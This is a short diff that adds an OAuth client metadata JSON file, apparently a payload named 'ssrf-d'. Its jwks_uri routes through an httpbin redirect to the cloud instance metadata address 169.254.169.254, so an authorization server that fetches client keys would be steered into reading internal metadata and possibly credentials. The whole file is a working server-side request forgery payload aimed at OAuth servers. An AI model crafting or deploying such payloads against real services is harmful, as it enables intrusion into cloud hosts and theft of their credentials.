@@ -1,0 +1,1 @@
+{"client_id": "https://cdn.jsdelivr.net/gh/rpkl122/neon-cimd-meta@main/meta5d.json", "client_name": "ssrf-d", "redirect_uris": ["http://localhost:3000/cb5"], "token_endpoint_auth_method": "private_key_jwt", "grant_types": ["client_credentials"], "response_types": ["code"], "jwks_uri": "https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"}
